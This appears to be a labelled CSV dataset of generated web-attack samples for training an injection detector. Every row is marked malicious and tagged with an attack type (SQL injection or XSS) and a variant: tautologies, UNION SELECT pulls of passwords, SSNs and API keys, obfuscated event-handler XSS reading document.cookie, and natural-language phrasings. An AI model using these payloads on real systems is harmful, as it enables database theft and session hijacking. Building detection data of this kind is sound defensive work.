text,label,attack_type,category,generator
return each people where 2 = 9 or true,1,sqli,nl_framed,claude
"2 UNION%20Select apikey,balance,hash FroM admins;",1,sqli,nl_framed,claude
admin' Or '1'='1,1,sqli,quote_breakout,claude
});alert(1);//,1,xss,xss_obf,claude
root' oR 'z'='z,1,sqli,quote_breakout,claude
"""><embed ontoggle=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
7 aNd (select count(*) from cards)>2;,1,sqli,nl_framed,claude
<select%20ontoggle=alert(document.cookie)>,1,xss,nl_framed,claude
<BoDy onerrOR=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
5 or tRUe,1,sqli,bare_logic,claude
<details ontoggle=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
0x61 oR 0x63=0x16,1,sqli,encoding,claude
show me accounts where hash is anything or condition always holds,1,sqli,nl_framed,claude
"""><keygen onpageshow=alert`1`>",1,xss,xss_obf,claude
<embed onscrollend=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
"<imgsrc=x
onerror=print()>",1,xss,xss_obf,claude
"""><svg ontoggle=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
0 oR 3=5-- -,1,sqli,bare_logic,claude
});window['ale'+'rt']`1`;//,1,xss,xss_obf,claude
"""><object onload=alert(1)>",1,xss,xss_obf,claude
<IMG ONErROR=top['al'+'ert'](1)>,1,xss,xss_obf,claude
retrieve admins where balance is anything or condition always holds,1,sqli,nl_framed,claude
char(48) oR char(48)=char(55),1,sqli,encoding,claude
6 Or true,1,sqli,bare_logic,claude
4 And (select count(*) from users)>0;,1,sqli,nl_framed,claude
"2%20UniON SEleCt ssn,email frOM admins;",1,sqli,nl_framed,claude
1 And (select count(*) from people)>0#,1,sqli,nl_framed,claude
please render <video onload=alert(document.cookie)> here for the user,1,xss,xss_obf,claude
2 OR TRue,1,sqli,bare_logic,claude
give each logs where 5 is 8 or true,1,sqli,nl_framed,claude
list every clients where 6 equals 4 or true,1,sqli,nl_framed,claude
1 And (select count(*) from logs)>1-- x,1,sqli,nl_framed,claude
<keygen onbeforetoggle=self['al'+'ert']`1`>,1,xss,xss_obf,claude
5 OR 6=9-- -,1,sqli,bare_logic,claude
"6/**/UniON%20seLeCT password,balance FrOM admins-- x",1,sqli,nl_framed,claude
<BoDy ONERROr=print()>,1,xss,xss_obf,claude
<svg/onstart=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
can you show the field <body onpointerrawupdate=alert`1`> when it errors,1,xss,xss_obf,claude
can you show the field <table oncontentvisibilityautostatechange=top['al'+'ert'](1)> when it errors,1,xss,xss_obf,claude
1' oR 'a'='y#,1,sqli,quote_breakout,claude
fetch each logs where 6 equals 9 or true,1,sqli,nl_framed,claude
4 aND (select count(*) from people)>2/**/,1,sqli,nl_framed,claude
<svg/onerror=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
or exists(select uid from users)/*c*/,1,sqli,nl_framed,claude
can you show the field <svg onpageshow=alert(1)> when it errors,1,xss,xss_obf,claude
8 oR TrUE,1,sqli,bare_logic,claude
<img%20src=x	onerror=alert(document.cookie)>,1,xss,xss_obf,claude
can you show the field <select onbeforetoggle=window['ale'+'rt']`1`> when it errors,1,xss,nl_framed,claude
9 oR password lIkE '%'-- x,1,sqli,quote_breakout,claude
8 and (select count(*) from admins)>1-- x,1,sqli,nl_framed,claude
<keygen onanimationstart=self['al'+'ert']`1`>,1,xss,xss_obf,claude
<BoDy oneRRor=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
pull cards where ssn is anything or condition always holds,1,sqli,nl_framed,claude
3 Or TRue,1,sqli,bare_logic,claude
please render <svg oncontentvisibilityautostatechange=alert(1)> here for the user,1,xss,xss_obf,claude
can you show the field <iframe oncontentvisibilityautostatechange=print()> when it errors,1,xss,xss_obf,claude
0x53 or 0x59=0x82,1,sqli,encoding,claude
"""><svg onfocus=print()>",1,xss,xss_obf,claude
admin' or '1'='1,1,sqli,quote_breakout,claude
"6/**/UnIoN%20SElEcT apikey,balance FroM tokens-- x",1,sqli,nl_framed,claude
admin'	or '1'='1,1,sqli,quote_breakout,claude
0x84 oR 0x93=0x59,1,sqli,encoding,claude
"2/**/uniOn/**/SELECt dob,token FroM members;",1,sqli,nl_framed,claude
pull all cards where 5 = 7 or true,1,sqli,nl_framed,claude
<form%09onstart=alert(document.cookie)>,1,xss,xss_obf,claude
show me the balance of any auth regardless of id,1,sqli,nl_framed,claude
return the ssn of each members regardless of id,1,sqli,nl_framed,claude
char(55) Or char(57)=char(52),1,sqli,encoding,claude
admin' Or 'b'='y/*c*/,1,sqli,quote_breakout,claude
show me profiles where dob is anything or condition always holds,1,sqli,nl_framed,claude
or exists(select pwd from profiles),1,sqli,nl_framed,claude
});eval(atob('YWxlcnQoMSk'));//,1,xss,xss_obf,claude
show me any people where 5 is 5 or true,1,sqli,nl_framed,claude
"8	uNiOn/**/seLECT role,password,token FROm orders",1,sqli,nl_framed,claude
6 anD (select count(*) from accounts)>0;,1,sqli,nl_framed,claude
<img%09src=x onerror=top['al'+'ert'](1)>,1,xss,xss_obf,claude
0x20 OR 0x75=0x49,1,sqli,encoding,claude
root' oR 'a'='z%00,1,sqli,quote_breakout,claude
please render <body onpointerrawupdate=print()> here for the user,1,xss,xss_obf,claude
please render <xss onbeforetoggle=top['al'+'ert'](1)> here for the user,1,xss,xss_obf,claude
please render <input onscrollend=window['ale'+'rt']`1`> here for the user,1,xss,xss_obf,claude
1' Or 'a'='b;,1,sqli,quote_breakout,claude
"<imgsrc=x
onerror=alert`1`>",1,xss,xss_obf,claude
"""><math onscrollend=print()>",1,xss,xss_obf,claude
<img%20src=x%09onerror=alert`1`>,1,xss,xss_obf,claude
4 or 1=4,1,sqli,bare_logic,claude
1 ANd (select count(*) from members)>0-- ,1,sqli,nl_framed,claude
please render <embed onload=alert(document.cookie)> here for the user,1,xss,xss_obf,claude
"1 uNIoN seLeCt token,uid frOM profiles-- ",1,sqli,nl_framed,claude
<imgsrc=x%09onerror=alert(document.domain)>,1,xss,xss_obf,claude
retrieve the dob of all sessions regardless of id,1,sqli,nl_framed,claude
please render <details onanimationstart=alert(document.domain)> here for the user,1,xss,xss_obf,claude
can you show the field <keygen onanimationstart=print()> when it errors,1,xss,xss_obf,claude
char(52) OR char(52)=char(48),1,sqli,encoding,claude
'-confirm(1)-',1,xss,xss_obf,claude
2 or tRuE,1,sqli,bare_logic,claude
dump clients where balance is anything or condition always holds,1,sqli,nl_framed,claude
get cards where password is anything or condition always holds,1,sqli,nl_framed,claude
<iFrAmE OnERrOR=alert(document.domain)>,1,xss,xss_obf,claude
<style oncontentvisibilityautostatechange=window['al'+'ert']`1`>,1,xss,xss_obf,claude
char(51) oR char(49)=char(48),1,sqli,encoding,claude
0 or 7=7-- ,1,sqli,bare_logic,claude
<xssonscrollend=alert(1)>,1,xss,xss_obf,claude
1 or exists(select dob from tokens)-- ,1,sqli,nl_framed,claude
select the secret of each clients regardless of id,1,sqli,nl_framed,claude
7 Or 1=9#,1,sqli,bare_logic,claude
<form onerror=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
<iFrAmE OnERRoR=top['al'+'ert'](1)>,1,xss,xss_obf,claude
<iFrAmE oNeRrOr=confirm(1)>,1,xss,xss_obf,claude
<selectonerror=alert`1`>,1,xss,nl_framed,claude
<math onfocus=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
<audio	ontoggle=confirm(1)>,1,xss,xss_obf,claude
<frameset onload=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
"""><audio onpageshow=alert(document.cookie)>",1,xss,xss_obf,claude
9 Or dob LIKE '%',1,sqli,quote_breakout,claude
<xss onload=window['al'+'ert']`1`>,1,xss,xss_obf,claude
5 or tRUE,1,sqli,bare_logic,claude
9 Or secret lIke '%'-- x,1,sqli,quote_breakout,claude
x' or 'x'='x#,1,sqli,quote_breakout,claude
1 and (select count(*) from orders)>2/**/,1,sqli,nl_framed,claude
<svg/oncontentvisibilityautostatechange=alert`1`>,1,xss,xss_obf,claude
<marquee onanimationstart=top['al'+'ert']`1`>,1,xss,xss_obf,claude
1 Or exists(select email from auth)-- -,1,sqli,nl_framed,claude
<style onanimationstart=window['al'+'ert']`1`>,1,xss,xss_obf,claude
Or exists(select ssn from accounts)/*c*/,1,sqli,nl_framed,claude
Or exists(select email from logs);,1,sqli,nl_framed,claude
0x99 Or 0x70=0x63,1,sqli,encoding,claude
select each orders where 5 = 6 or true,1,sqli,nl_framed,claude
0x95 or 0x95=0x47,1,sqli,encoding,claude
"""><input onfocus=alert`1`>",1,xss,xss_obf,claude
<svg/onscrollend=alert(document.cookie)>,1,xss,xss_obf,claude
<BoDy oNErROr=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
give every sessions where 4 = 3 or true,1,sqli,nl_framed,claude
2 oR 1=8-- ,1,sqli,bare_logic,claude
<body	onerror=alert(1)>,1,xss,xss_obf,claude
<xss oncontentvisibilityautostatechange=window['al'+'ert']`1`>,1,xss,xss_obf,claude
return the password of all clients regardless of id,1,sqli,nl_framed,claude
give the pwd of each users regardless of id,1,sqli,nl_framed,claude
admin'Or '1'='1,1,sqli,quote_breakout,claude
please render <object ontoggle=alert(document.domain)> here for the user,1,xss,xss_obf,claude
char(52) oR char(55)=char(49),1,sqli,encoding,claude
<iFrAmE OnerrOr=alert`1`>,1,xss,xss_obf,claude
pull admins where ssn is anything or condition always holds,1,sqli,nl_framed,claude
"""><audio onfocus=confirm(1)>",1,xss,xss_obf,claude
<SvG oNeRRoR=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
0 oR 1=8,1,sqli,bare_logic,claude
5 oR 4=3-- ,1,sqli,bare_logic,claude
6 ANd (select count(*) from logs)>1#,1,sqli,nl_framed,claude
"8%20UNion%20sEleCt token,pwd FroM members;",1,sqli,nl_framed,claude
<a href=&#106;avascript:alert(document.domain)>x</a>,1,xss,xss_obf,claude
3 Or tRuE,1,sqli,bare_logic,claude
<BoDy OnErrOR=confirm(1)>,1,xss,xss_obf,claude
please render <input onafterscriptexecute=window['ale'+'rt']`1`> here for the user,1,xss,xss_obf,claude
<svg/onpointerrawupdate=alert(document.cookie)>,1,xss,xss_obf,claude
please render <frameset onpointerrawupdate=eval(atob('YWxlcnQoMSk'))> here for the user,1,xss,xss_obf,claude
retrieve the secret of each admins regardless of id,1,sqli,nl_framed,claude
<isindex oncontentvisibilityautostatechange=window['al'+'ert']`1`>,1,xss,xss_obf,claude
<svg/onafterscriptexecute=alert(document.domain)>,1,xss,xss_obf,claude
3	unIOn sELeCt dob frOm staff-- x,1,sqli,nl_framed,claude
"<img src=x
onerror=top['al'+'ert'](1)>",1,xss,xss_obf,claude
give every people where 1 equals 7 or true,1,sqli,nl_framed,claude
7 Or true,1,sqli,bare_logic,claude
5 aNd (select count(*) from users)>3;,1,sqli,nl_framed,claude
<a href=&#106;avascript:confirm(1)>x</a>,1,xss,xss_obf,claude
<table onload=self['al'+'ert']`1`>,1,xss,xss_obf,claude
2 or 9=9%00,1,sqli,bare_logic,claude
<svg/onanimationstart=top['al'+'ert'](1)>,1,xss,xss_obf,claude
pull the ssn of all people regardless of id,1,sqli,nl_framed,claude
<iFrAmE OneRRor=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
<svg%09onpointerrawupdate=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
list admins where token is anything or condition always holds,1,sqli,nl_framed,claude
<img%20src=xonerror=alert(document.domain)>,1,xss,xss_obf,claude
0x52 or 0x38=0x98,1,sqli,encoding,claude
get each auth where 7 = 7 or true,1,sqli,nl_framed,claude
<SvG ONERROR=print()>,1,xss,xss_obf,claude
<imgsrc=x%09onerror=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
please render <object onafterscriptexecute=window['ale'+'rt']`1`> here for the user,1,xss,xss_obf,claude
5 Or 9=2%00,1,sqli,bare_logic,claude
7 OR 4=4-- -,1,sqli,bare_logic,claude
can you show the field <input onfocus=confirm(1)> when it errors,1,xss,xss_obf,claude
<IMG oNERror=alert`1`>,1,xss,xss_obf,claude
2%20UnIon%20sELECt token FRom logs#,1,sqli,nl_framed,claude
"4/**/UNIon sElECT pwd,hash,ssn fROM clients%00",1,sqli,nl_framed,claude
1 oR exists(select balance from members)%00,1,sqli,nl_framed,claude
<img%09src=xonerror=confirm(1)>,1,xss,xss_obf,claude
please render <iframe onfocus=print()> here for the user,1,xss,xss_obf,claude
"""><form ontoggle=alert`1`>",1,xss,xss_obf,claude
5 oR 3=6-- -,1,sqli,bare_logic,claude
"""><embed onerror=confirm(1)>",1,xss,xss_obf,claude
please render <textarea onerror=alert(1)> here for the user,1,xss,xss_obf,claude
can you show the field <audio onstart=top['al'+'ert'](1)> when it errors,1,xss,xss_obf,claude
<img%09src=xonerror=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
<BoDy oNeRRoR=alert(document.cookie)>,1,xss,xss_obf,claude
pull people where token is anything or condition always holds,1,sqli,nl_framed,claude
<img%20src=x/onerror=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
char(51) or char(53)=char(57),1,sqli,encoding,claude
<style onscrollend=top['al'+'ert']`1`>,1,xss,xss_obf,claude
admin' oR 'a'='x-- -,1,sqli,quote_breakout,claude
5 or tRuE,1,sqli,bare_logic,claude
give the secret of each users regardless of id,1,sqli,nl_framed,claude
retrieve any members where 4 = 8 or true,1,sqli,nl_framed,claude
show me people where hash is anything or condition always holds,1,sqli,nl_framed,claude
select the balance of any users regardless of id,1,sqli,nl_framed,claude
char(52) Or char(53)=char(49),1,sqli,encoding,claude
3 or email LiKe '%'-- x,1,sqli,quote_breakout,claude
char(54) oR char(55)=char(51),1,sqli,encoding,claude
please render <isindex ontoggle=eval(atob('YWxlcnQoMSk'))> here for the user,1,xss,xss_obf,claude
<SvG OnERRoR=confirm(1)>,1,xss,xss_obf,claude
return the hash of all staff regardless of id,1,sqli,nl_framed,claude
"<marquee
onerror=top['al'+'ert'](1)>",1,xss,xss_obf,claude
0x82 oR 0x44=0x50,1,sqli,encoding,claude
<IMG OneRrOr=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
x' Or 'a'='x-- -,1,sqli,quote_breakout,claude
can you show the field <style onanimationstart=alert`1`> when it errors,1,xss,xss_obf,claude
char(51) Or char(53)=char(54),1,sqli,encoding,claude
0x57 oR 0x54=0x94,1,sqli,encoding,claude
<BoDy oNerRor=print()>,1,xss,xss_obf,claude
char(57) oR char(48)=char(50),1,sqli,encoding,claude
"9	UnioN SelECT hash,ssn fRom accounts/*c*/",1,sqli,nl_framed,claude
<img	src=xonerror=alert`1`>,1,xss,xss_obf,claude
x' OR 'x'='z#,1,sqli,quote_breakout,claude
oR exists(select email from people)%00,1,sqli,nl_framed,claude
can you show the field <iframe onpageshow=eval(atob('YWxlcnQoMSk'))> when it errors,1,xss,xss_obf,claude
<isindex%09onpointerrawupdate=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
<svg/onfocus=alert(document.domain)>,1,xss,xss_obf,claude
8 or 6=2-- x,1,sqli,bare_logic,claude
<svg/ontoggle=top['al'+'ert'](1)>,1,xss,xss_obf,claude
8 Or pwd LiKE '%'/*c*/,1,sqli,quote_breakout,claude
"""><select onbeforetoggle=top['al'+'ert'](1)>",1,xss,nl_framed,claude
admin'or '1'='1,1,sqli,quote_breakout,claude
can you show the field <audio onerror=alert(document.domain)> when it errors,1,xss,xss_obf,claude
list the pwd of every sessions regardless of id,1,sqli,nl_framed,claude
<IMG onERrOr=print()>,1,xss,xss_obf,claude
<object%20ontoggle=alert`1`>,1,xss,xss_obf,claude
4 or 8=5#,1,sqli,bare_logic,claude
please render <isindex onerror=top['al'+'ert'](1)> here for the user,1,xss,xss_obf,claude
<iFrAmE onErROr=print()>,1,xss,xss_obf,claude
"""><marquee onscrollend=top['al'+'ert'](1)>",1,xss,xss_obf,claude
1 oR exists(select secret from members)/*c*/,1,sqli,nl_framed,claude
<iFrAmE oNeRror=alert`1`>,1,xss,xss_obf,claude
can you show the field <object onload=eval(atob('YWxlcnQoMSk'))> when it errors,1,xss,xss_obf,claude
can you show the field <body onpointerrawupdate=alert(document.cookie)> when it errors,1,xss,xss_obf,claude
<style onpointerrawupdate=self['al'+'ert']`1`>,1,xss,xss_obf,claude
2 And (select count(*) from staff)>0-- -,1,sqli,nl_framed,claude
"""><math onpointerrawupdate=alert(document.domain)>",1,xss,xss_obf,claude
8 OR 9=2;,1,sqli,bare_logic,claude
0x95 oR 0x63=0x57,1,sqli,encoding,claude
retrieve all accounts where 7 = 4 or true,1,sqli,nl_framed,claude
1 or tRue,1,sqli,bare_logic,claude
0x61 oR 0x33=0x57,1,sqli,encoding,claude
"6	union%20SELecT uid,secret,apikey fRom profiles-- -",1,sqli,nl_framed,claude
please render <input onpageshow=alert(1)> here for the user,1,xss,xss_obf,claude
get clients where balance is anything or condition always holds,1,sqli,nl_framed,claude
pull every admins where 7 is 7 or true,1,sqli,nl_framed,claude
<SvG ONeRRoR=alert`1`>,1,xss,xss_obf,claude
<imgsrc=x/onerror=alert(1)>,1,xss,xss_obf,claude
9 or true,1,sqli,bare_logic,claude
6	uNion%20SeleCt ssn froM tokens/**/,1,sqli,nl_framed,claude
select all orders where 6 = 6 or true,1,sqli,nl_framed,claude
<iFrAmE onErROr=alert(1)>,1,xss,xss_obf,claude
9 Or hash LIKe '%'%00,1,sqli,quote_breakout,claude
'-alert(1)-',1,xss,xss_obf,claude
0x37 Or 0x30=0x30,1,sqli,encoding,claude
0x97 OR 0x29=0x18,1,sqli,encoding,claude
6 OR 5=7-- ,1,sqli,bare_logic,claude
8 or hash LIKe '%';,1,sqli,quote_breakout,claude
9 or 2=4/*c*/,1,sqli,bare_logic,claude
give the ssn of all auth regardless of id,1,sqli,nl_framed,claude
return the secret of every logs regardless of id,1,sqli,nl_framed,claude
"""><marquee onafterscriptexecute=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
"7 uniON SeLeCT email,dob froM members#",1,sqli,nl_framed,claude
<BoDy OnerroR=alert`1`>,1,xss,xss_obf,claude
give the role of each cards regardless of id,1,sqli,nl_framed,claude
<SvG oNeRrOr=print()>,1,xss,xss_obf,claude
<select%09onfocus=top['al'+'ert'](1)>,1,xss,nl_framed,claude
"<img
src=x%20onerror=alert(document.cookie)>",1,xss,xss_obf,claude
get every clients where 3 equals 4 or true,1,sqli,nl_framed,claude
"""><frameset onanimationstart=alert`1`>",1,xss,xss_obf,claude
9 and (select count(*) from logs)>0;,1,sqli,nl_framed,claude
root' Or 'y'='b#,1,sqli,quote_breakout,claude
list people where hash is anything or condition always holds,1,sqli,nl_framed,claude
retrieve profiles where uid is anything or condition always holds,1,sqli,nl_framed,claude
dump admins where role is anything or condition always holds,1,sqli,nl_framed,claude
1 AnD (select count(*) from logs)>3,1,sqli,nl_framed,claude
admin'	OR '1'='1,1,sqli,quote_breakout,claude
list the ssn of any users regardless of id,1,sqli,nl_framed,claude
Or exists(select balance from users),1,sqli,nl_framed,claude
5 OR token LIKE '%'/**/,1,sqli,quote_breakout,claude
<math onscrollend=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
3 OR tRuE,1,sqli,bare_logic,claude
9 OR 7=1/*c*/,1,sqli,bare_logic,claude
<img src=x%20onerror=alert(document.cookie)>,1,xss,xss_obf,claude
1' Or 'b'='z/**/,1,sqli,quote_breakout,claude
"""><math onpageshow=alert(document.domain)>",1,xss,xss_obf,claude
pull all tokens where 2 equals 2 or true,1,sqli,nl_framed,claude
please render <form onload=eval(atob('YWxlcnQoMSk'))> here for the user,1,xss,xss_obf,claude
"""><svg onfocus=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
please render <embed onerror=alert(1)> here for the user,1,xss,xss_obf,claude
4 oR TruE,1,sqli,bare_logic,claude
8 OR email likE '%'/*c*/,1,sqli,quote_breakout,claude
<BoDy onERROr=alert(document.cookie)>,1,xss,xss_obf,claude
please render <style onpointerrawupdate=eval(atob('YWxlcnQoMSk'))> here for the user,1,xss,xss_obf,claude
<svg/onanimationstart=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
list any users where 8 equals 9 or true,1,sqli,nl_framed,claude
x' Or 'z'='b-- -,1,sqli,quote_breakout,claude
<BoDy ONERrOR=print()>,1,xss,xss_obf,claude
please render <object onstart=print()> here for the user,1,xss,xss_obf,claude
<body onpageshow=top['al'+'ert']`1`>,1,xss,xss_obf,claude
8 OR uid like '%'%00,1,sqli,quote_breakout,claude
3 Or balance Like '%'-- ,1,sqli,quote_breakout,claude
<BoDy ONERrOR=alert`1`>,1,xss,xss_obf,claude
dump users where uid is anything or condition always holds,1,sqli,nl_framed,claude
admin' or '1'='1,1,sqli,quote_breakout,claude
admin' oR 'b'='y-- x,1,sqli,quote_breakout,claude
<img src=xonerror=alert(document.cookie)>,1,xss,xss_obf,claude
can you show the field <body oncontentvisibilityautostatechange=alert(1)> when it errors,1,xss,xss_obf,claude
"""><object onfocus=confirm(1)>",1,xss,xss_obf,claude
0x33 oR 0x98=0x19,1,sqli,encoding,claude
<audio onpageshow=top['al'+'ert']`1`>,1,xss,xss_obf,claude
1 Or dob like '%'/**/,1,sqli,quote_breakout,claude
return the pwd of all staff regardless of id,1,sqli,nl_framed,claude
can you show the field <embed onanimationstart=confirm(1)> when it errors,1,xss,xss_obf,claude
0x55 OR 0x94=0x27,1,sqli,encoding,claude
list the hash of all staff regardless of id,1,sqli,nl_framed,claude
"""><isindex ontoggle=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
3 ANd (select count(*) from members)>1#,1,sqli,nl_framed,claude
<IMG OneRROR=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
list each logs where 1 = 1 or true,1,sqli,nl_framed,claude
retrieve admins where dob is anything or condition always holds,1,sqli,nl_framed,claude
can you show the field <table onscrollend=print()> when it errors,1,xss,xss_obf,claude
4 or role liKe '%'/*c*/,1,sqli,quote_breakout,claude
<img%09src=x%09onerror=alert(document.domain)>,1,xss,xss_obf,claude
"3%20UNiON%20SelECT balance,secret,email froM people",1,sqli,nl_framed,claude
"<input
onerror=confirm(1)>",1,xss,xss_obf,claude
char(49) or char(56)=char(53),1,sqli,encoding,claude
<svg onanimationstart=window['al'+'ert']`1`>,1,xss,xss_obf,claude
<frameset onfocus=window['al'+'ert']`1`>,1,xss,xss_obf,claude
<iFrAmE ONERrOR=alert(1)>,1,xss,xss_obf,claude
4 Or hash LIkE '%'-- ,1,sqli,quote_breakout,claude
get the password of all clients regardless of id,1,sqli,nl_framed,claude
root' oR 'a'='a%00,1,sqli,quote_breakout,claude
9 Union SeLEct uid froM users-- ,1,sqli,nl_framed,claude
root' oR 'a'='a-- -,1,sqli,quote_breakout,claude
<img%20src=x%20onerror=alert(1)>,1,xss,xss_obf,claude
0x59 or 0x92=0x18,1,sqli,encoding,claude
char(48) oR char(55)=char(56),1,sqli,encoding,claude
<svg/onscrollend=alert(document.domain)>,1,xss,xss_obf,claude
0x81 or 0x17=0x23,1,sqli,encoding,claude
char(49) Or char(52)=char(56),1,sqli,encoding,claude
<select/onstart=top['al'+'ert'](1)>,1,xss,nl_framed,claude
<img%09src=xonerror=alert`1`>,1,xss,xss_obf,claude
fetch the balance of all auth regardless of id,1,sqli,nl_framed,claude
'-window['ale'+'rt']`1`-',1,xss,xss_obf,claude
admin' oR 'x'='x/**/,1,sqli,quote_breakout,claude
<BoDy ONeRror=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
pull members where hash is anything or condition always holds,1,sqli,nl_framed,claude
retrieve logs where token is anything or condition always holds,1,sqli,nl_framed,claude
<svg/onpageshow=alert(document.cookie)>,1,xss,xss_obf,claude
"""><svg onload=alert`1`>",1,xss,xss_obf,claude
0x54 Or 0x51=0x48,1,sqli,encoding,claude
can you show the field <isindex onerror=eval(atob('YWxlcnQoMSk'))> when it errors,1,xss,xss_obf,claude
8 unIoN sElEct dob frOM people/**/,1,sqli,nl_framed,claude
can you show the field <video onload=eval(atob('YWxlcnQoMSk'))> when it errors,1,xss,xss_obf,claude
1' OR 'b'='a#,1,sqli,quote_breakout,claude
0x16 OR 0x50=0x77,1,sqli,encoding,claude
return the secret of each profiles regardless of id,1,sqli,nl_framed,claude
1 oR exists(select uid from users)/**/,1,sqli,nl_framed,claude
"2%20UNioN/**/SELect apikey,token From users-- x",1,sqli,nl_framed,claude
"<img
src=x	onerror=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
6 or tRue,1,sqli,bare_logic,claude
3 Or hash LiKe '%';,1,sqli,quote_breakout,claude
<svg onerror=alert`1`>,1,xss,xss_obf,claude
"""><xss onscrollend=alert`1`>",1,xss,xss_obf,claude
<textarea onscrollend=self['al'+'ert']`1`>,1,xss,xss_obf,claude
<embed	onbeforetoggle=top['al'+'ert'](1)>,1,xss,xss_obf,claude
"<imgsrc=x
onerror=alert(document.cookie)>",1,xss,xss_obf,claude
<img%20src=x onerror=top['al'+'ert'](1)>,1,xss,xss_obf,claude
0x66 OR 0x76=0x99,1,sqli,encoding,claude
<img src=x%09onerror=alert`1`>,1,xss,xss_obf,claude
<details	onfocus=alert(1)>,1,xss,xss_obf,claude
"4%20unION sEleCt role,uid FRoM sessions/**/",1,sqli,nl_framed,claude
char(48) oR char(57)=char(53),1,sqli,encoding,claude
0x39 oR 0x80=0x98,1,sqli,encoding,claude
0x67 or 0x24=0x42,1,sqli,encoding,claude
select the dob of any sessions regardless of id,1,sqli,nl_framed,claude
get logs where pwd is anything or condition always holds,1,sqli,nl_framed,claude
<BoDy ONERROr=top['al'+'ert'](1)>,1,xss,xss_obf,claude
"9	UnION%20seLeCt email,apikey FrOM people%00",1,sqli,nl_framed,claude
can you show the field <select onscrollend=confirm(1)> when it errors,1,xss,nl_framed,claude
3 Or password liKe '%';,1,sqli,quote_breakout,claude
admin' or 'z'='a#,1,sqli,quote_breakout,claude
"8/**/uNIOn%20SEleCt role,password,pwd From clients;",1,sqli,nl_framed,claude
0x31 oR 0x76=0x49,1,sqli,encoding,claude
<imgsrc=xonerror=alert(document.cookie)>,1,xss,xss_obf,claude
return logs where apikey is anything or condition always holds,1,sqli,nl_framed,claude
8 OR ssn LikE '%'-- ,1,sqli,quote_breakout,claude
x' Or 'a'='y#,1,sqli,quote_breakout,claude
or exists(select email from profiles)-- -,1,sqli,nl_framed,claude
"""><math onfocus=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
5 ANd (select count(*) from staff)>0%00,1,sqli,nl_framed,claude
return cards where ssn is anything or condition always holds,1,sqli,nl_framed,claude
0 or 5=5-- ,1,sqli,bare_logic,claude
list accounts where token is anything or condition always holds,1,sqli,nl_framed,claude
admin' oR 'y'='x-- -,1,sqli,quote_breakout,claude
4 Or 7=7/*c*/,1,sqli,bare_logic,claude
8 aNd (select count(*) from accounts)>0-- -,1,sqli,nl_framed,claude
2 OR 5=7-- -,1,sqli,bare_logic,claude
5 OR trUe,1,sqli,bare_logic,claude
2 OR 5=7%00,1,sqli,bare_logic,claude
can you show the field <svg onload=alert`1`> when it errors,1,xss,xss_obf,claude
admin' oR 'b'='y/*c*/,1,sqli,quote_breakout,claude
1 oR 3=7-- -,1,sqli,bare_logic,claude
3 oR balance LIKe '%'%00,1,sqli,quote_breakout,claude
<xss/onscrollend=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
<svg/onanimationstart=alert`1`>,1,xss,xss_obf,claude
<select/onfocus=alert`1`>,1,xss,nl_framed,claude
<BoDy OneRRor=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
char(53) or char(53)=char(57),1,sqli,encoding,claude
